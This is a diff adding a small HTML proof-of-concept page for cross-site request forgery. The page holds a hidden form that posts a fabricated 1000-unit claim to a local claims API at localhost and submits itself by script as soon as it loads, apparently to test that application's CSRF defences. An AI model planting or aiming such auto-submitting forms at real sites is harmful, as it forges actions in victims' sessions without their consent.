@@ -1,0 +1,10 @@
+<html>
+  <form action="https://localhost:5001/api/claims" method="POST">
+    <input type="hidden" name="title" value="CSRF Attack">
+    <input type="hidden" name="description" value="Hacked via CSRF">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="category" value="Other">
+    <input type="submit" value="Submit">
+  </form>
+  <script>document.forms[0].submit();</script>
+</html>
